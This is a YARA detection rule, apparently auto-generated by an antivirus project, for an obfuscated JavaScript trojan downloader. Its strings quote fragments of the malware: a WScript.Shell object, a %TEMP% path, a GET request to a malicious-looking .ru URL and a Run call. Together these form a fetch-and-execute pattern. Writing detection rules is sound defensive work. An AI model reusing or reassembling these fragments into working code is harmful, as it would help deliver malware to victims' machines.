rule sig_20160427_19c7d85d3b444a4300e1db530828de8c {
  meta:
    description = "datamaliciousorder - file 20160427_19c7d85d3b444a4300e1db530828de8c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1fb20d3b05edbefcae8363f1a4fc64e80b12b84bbb07bcf06f7eed4481b4f9e9"

  strings:
    $s1  = "function RrbwpMmdce() {return AmvquKepbg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"0jOOcpe" ascii
    $s2  = "function RrbwpMmdce() {return AmvquKepbg[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"0jOOcpe" ascii
    $s3  = "function KunacXrier(NngezZkgry, NpohlOumsz){MlzokPpouv = MlzokPpouv * 1; return NngezZkgry - NpohlOumsz;};" fullword ascii
    $s4  = "var AmvquKepbg = function AelazGdzbs() {return EguijNhbvv[HnhdiEjlge](\"WScript\"+\".Shell\");}(), SeohyTfuwg = 11;" fullword ascii
    $s5  = "NydxbOigfq[QtlydRmxdr](\"G\" + \"ET\", \"http://warcraft-lich-king.ru/i4ospd\", false);" fullword ascii
    $s6  = "var EguijNhbvv = this[\"WScript\"];" fullword ascii
    $s7  = "if (NydxbOigfq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function YwygjDcwns(){return BhzdgNgaqc + \"\";};" fullword ascii
    $s9  = "function DxiekXkcti() {return ((NkutbEwxpp == true) && (NkutbEwxpp == EgcqhJttya)) ? 1 : MlzokPpouv;};" fullword ascii
    $s10 = "function HnqhoArbju()" fullword ascii
    $s11 = "var AlldkWibwe = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "return KunacXrier(YynzlNgjky, KonmoKldsw);" fullword ascii
    $s13 = "var NkutbEwxpp = false;" fullword ascii
    $s14 = "function FamrjGjfqw(XieghGjucv) {var LvctjBskja = (1, 2, 3, 4, 5, XieghGjucv); return LvctjBskja;};" fullword ascii
    $s15 = "function IbfuiArjmv(SwtogNyhgc){AmvquKepbg[\"R\"+\"un\"](SwtogNyhgc, MlzokPpouv, MlzokPpouv);};" fullword ascii
    $s16 = "}while (LuuusWnmuo);" fullword ascii
    $s17 = "function GtyxpKaiwy(){return 23;};" fullword ascii
    $s18 = "EgcqhJttya = true; " fullword ascii
    $s19 = "NkutbEwxpp = true; " fullword ascii
    $s20 = "var EgcqhJttya = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}